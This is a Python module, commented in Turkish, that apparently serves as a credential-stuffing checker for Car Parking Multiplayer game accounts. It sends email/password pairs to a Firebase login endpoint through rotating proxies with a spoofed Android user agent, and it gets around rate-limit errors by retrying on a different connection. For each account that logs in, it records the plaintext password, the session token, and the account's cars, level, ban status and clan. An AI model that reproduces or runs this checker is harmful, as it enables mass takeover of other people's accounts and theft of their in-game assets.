import json
import asyncio
import aiohttp
from datetime import datetime
from typing import Tuple, Dict, Any, Optional, List

from config import (
    AUTH_LOGIN_URL,
    AUTH_LOOKUP_URL,
    CF_BASE_URL,
    APIFY_PROXY_URL
)
from proxy_manager import proxy_mgr

def format_ts(ts_val) -> str:
    """Unix timestamp veya string tarihi standart formata çevirir."""
    if not ts_val:
        return "Bilinmiyor"
    try:
        val = int(ts_val)
        if val > 100000000000:
            val = val / 1000
        return datetime.fromtimestamp(val).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts_val)

async def async_http_post(
    session: aiohttp.ClientSession,
    url: str,
    payload: dict,
    headers: Optional[dict] = None,
    timeout: float = 4.0,
    proxy: Optional[str] = None
) -> Tuple[Optional[dict], Optional[str]]:
    """Ultra hızlı asenkron HTTP POST isteği."""
    default_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"
    }
    if headers:
        default_headers.update(headers)

    req_proxy = proxy
    if req_proxy and not (req_proxy.startswith("http://") or req_proxy.startswith("https://") or req_proxy.startswith("socks4://") or req_proxy.startswith("socks5://")):
        req_proxy = f"http://{req_proxy}"

    try:
        async with session.post(
            url,
            json=payload,
            headers=default_headers,
            proxy=req_proxy,
            timeout=aiohttp.ClientTimeout(total=timeout, connect=2.0, sock_read=3.0)
        ) as resp:
            text = await resp.text()
            try:
                data = json.loads(text)
            except Exception:
                data = {"raw_text": text}
            return data, None
    except asyncio.TimeoutError:
        return None, "Zaman Aşımı (Timeout)"
    except aiohttp.ClientProxyConnectionError:
        return None, "Proxy Hatası"
    except Exception as e:
        return None, str(e)

async def fetch_cpm_account_details(
    session: aiohttp.ClientSession,
    email: str,
    password: str,
    id_token: str,
    uid: str,
    proxy: Optional[str] = None
) -> Dict[str, Any]:
    """Firebase doğrulanmış hesabın oyun içi detaylarını paralel çeker."""
    details = {
        "email": email,
        "password": password,
        "uid": uid,
        "idToken": id_token,
        "cpm_level": 0,
        "cpm_reports": 0,
        "cpm_can_play": 1,
        "cpm_total_cars": 0,
        "cpm_unlocked_cars": 0,
        "cpm_unlocked_ids": [],
        "cpm_custom_cars": 0,
        "cpm_custom_ids": [],
        "cpm_cars": [],
        "cpm_clan_id": None,
        "firebase_profile": {},
        "checked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    cf_headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {id_token}"
    }

    tasks = [
        async_http_post(session, AUTH_LOOKUP_URL, {"idToken": id_token}, timeout=3.5, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/WSGetCarIDnStatusV3", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetAllCars2", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
        async_http_post(session, f"{CF_BASE_URL}/GetClanId", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)

    prof_res, _ = results[0] if isinstance(results[0], tuple) else (None, None)
    conn_res, _ = results[1] if isinstance(results[1], tuple) else (None, None)
    status_res, _ = results[2] if isinstance(results[2], tuple) else (None, None)
    cars_res, _ = results[3] if isinstance(results[3], tuple) else (None, None)
    clan_res, _ = results[4] if isinstance(results[4], tuple) else (None, None)

    # 1. Firebase Profil
    if prof_res and isinstance(prof_res, dict) and "users" in prof_res and len(prof_res["users"]) > 0:
        u = prof_res["users"][0]
        details["firebase_profile"] = {
            "displayName": u.get("displayName"),
            "photoUrl": u.get("photoUrl"),
            "emailVerified": u.get("emailVerified", False),
            "disabled": u.get("disabled", False),
            "createdAt": format_ts(u.get("createdAt")),
            "lastLoginAt": format_ts(u.get("lastLoginAt")),
            "passwordUpdatedAt": format_ts(u.get("passwordUpdatedAt"))
        }

    # 2. Level, Reports, CanPlay
    if conn_res and isinstance(conn_res, dict) and "result" in conn_res:
        try:
            c_data = json.loads(conn_res["result"]) if isinstance(conn_res["result"], str) else conn_res["result"]
            if isinstance(c_data, dict):
                details["cpm_level"] = c_data.get("level", 0)
                details["cpm_reports"] = c_data.get("reports", 0)
                details["cpm_can_play"] = c_data.get("canPlay", 1)
        except Exception:
            pass

    # 3. Açık Araç ID Listesi
    if status_res and isinstance(status_res, dict) and "result" in status_res:
        try:
            s_data = json.loads(status_res["result"]) if isinstance(status_res["result"], str) else status_res["result"]
            if isinstance(s_data, dict) and "carStatus" in s_data:
                car_status = s_data["carStatus"]
                unlocked_ids = [i for i, x in enumerate(car_status) if x == 1]
                details["cpm_unlocked_cars"] = len(unlocked_ids)
                details["cpm_unlocked_ids"] = unlocked_ids
        except Exception:
            pass

    # 4. Modifiyeli Garaj Araç ID Listesi
    if cars_res and isinstance(cars_res, dict) and "result" in cars_res:
        try:
            raw_cars = json.loads(cars_res["result"]) if isinstance(cars_res["result"], str) else cars_res["result"]
            if isinstance(raw_cars, list):
                custom_ids = []
                for car in raw_cars:
                    if isinstance(car, dict) and "carId" in car:
                        custom_ids.append(car["carId"])
                details["cpm_custom_cars"] = len(custom_ids)
                details["cpm_custom_ids"] = custom_ids
                details["cpm_cars"] = raw_cars
        except Exception:
            pass

    # 5. Klan ID
    if clan_res and isinstance(clan_res, dict) and "result" in clan_res:
        try:
            cl_data = json.loads(clan_res["result"]) if isinstance(clan_res["result"], str) else clan_res["result"]
            if isinstance(cl_data, dict):
                details["cpm_clan_id"] = cl_data.get("clanId")
            elif isinstance(cl_data, str) and cl_data:
                details["cpm_clan_id"] = cl_data
        except Exception:
            pass

    details["cpm_total_cars"] = max(details["cpm_unlocked_cars"], details["cpm_custom_cars"])
    return details

async def check_cpm_account(
    session: aiohttp.ClientSession,
    email: str,
    password: str,
    proxy: Optional[str] = None
) -> Tuple[bool, Optional[Dict[str, Any]], Optional[str]]:
    """
    Ultra hızlı ve takılmayan 2 Aşamalı CPM Hesap Kontrolü.
    1. Aşama: Apify / Hızlı Proxy
    2. Aşama: Doğrudan Temiz Bağlantı (Fallback)
    """
    login_payload = {
        "email": email.strip(),
        "password": password.strip(),
        "returnSecureToken": True
    }

    proxies_to_try = [
        proxy if proxy else (APIFY_PROXY_URL if APIFY_PROXY_URL else proxy_mgr.get_random_proxy()),
        None  # Doğrudan temiz bağlantı (en hızlı ve kesin)
    ]

    last_err = "Bilinmeyen Hata"

    for current_proxy in proxies_to_try:
        data, err = await async_http_post(
            session=session,
            url=AUTH_LOGIN_URL,
            payload=login_payload,
            timeout=3.5,
            proxy=current_proxy
        )

        if err:
            last_err = err
            continue

        if not data:
            last_err = "Yanıt Alınamadı"
            continue

        # Başarılı Giriş
        if "idToken" in data and "localId" in data:
            id_token = data["idToken"]
            uid = data["localId"]
            details = await fetch_cpm_account_details(session, email, password, id_token, uid, proxy=current_proxy)
            return True, details, None

        # Kesin Firebase Kimlik Hataları (Anında Çıkış)
        if "error" in data and isinstance(data["error"], dict):
            msg = data["error"].get("message", "UNKNOWN_ERROR")
            if "INVALID_PASSWORD" in msg or "INVALID_LOGIN_CREDENTIALS" in msg:
                return False, None, "Hatalı Şifre"
            elif "EMAIL_NOT_FOUND" in msg:
                return False, None, "Hesap Bulunamadı"
            elif "USER_DISABLED" in msg:
                return False, None, "Hesap Devre Dışı"
            elif "TOO_MANY_ATTEMPTS_TRY_LATER" in msg:
                last_err = "Geçici Hız Sınırı"
                continue
            else:
                return False, None, f"Firebase: {msg}"

        last_err = "Giriş Yapılamadı"

    return False, None, last_err
